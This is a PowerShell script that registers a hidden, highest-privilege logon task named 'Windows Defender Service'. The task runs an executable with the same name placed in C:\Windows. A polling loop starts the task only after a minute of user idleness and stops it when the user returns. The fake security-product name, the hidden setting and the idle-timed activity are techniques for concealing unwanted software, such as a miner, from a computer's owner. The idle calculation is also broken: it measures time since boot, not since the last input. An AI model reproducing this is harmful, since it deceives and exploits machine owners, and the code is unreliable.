$TaskName = "Windows Defender Service"
$ExePath = "C:\Windows\Windows Defender Service.exe" # Replace with your EXE path

# Create the action
$Action = New-ScheduledTaskAction -Execute $ExePath

# Create the logon trigger (as a fallback)
$LogonTrigger = New-ScheduledTaskTrigger -AtLogOn

# Create the settings
$Settings = New-ScheduledTaskSettingsSet -Hidden

# Create the principal
$Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest

# Register the task with a logon trigger
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $LogonTrigger -Settings $Settings -Principal $Principal -Force

# Function to check idle time and start/stop the task
function Check-IdleTask {
    $IdleTime = (Get-WmiObject -Class Win32_PerfFormattedData_PerfOS_System).SystemUpTime

    $LastInput = (Get-WmiObject -Class Win32_ComputerSystem).LastBootUpTime
    $LastInput = [System.Management.ManagementDateTimeConverter]::ToDateTime($LastInput)
    $LastInput = $LastInput.AddMilliseconds((Get-WmiObject -Class Win32_PerfFormattedData_PerfOS_System).SystemUpTime)

    $IdleSeconds = ((Get-Date) - $LastInput).TotalSeconds

    if ($IdleSeconds -ge 60) {
        # Idle for 1 minute, start the task
        Start-ScheduledTask -TaskName $TaskName
    } else {
        # Not idle, stop the task
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue # prevent error if the task is already stopped
    }
}

# Run the check every 10 seconds
while ($true) {
    Check-IdleTask
    Start-Sleep -Seconds 10
}
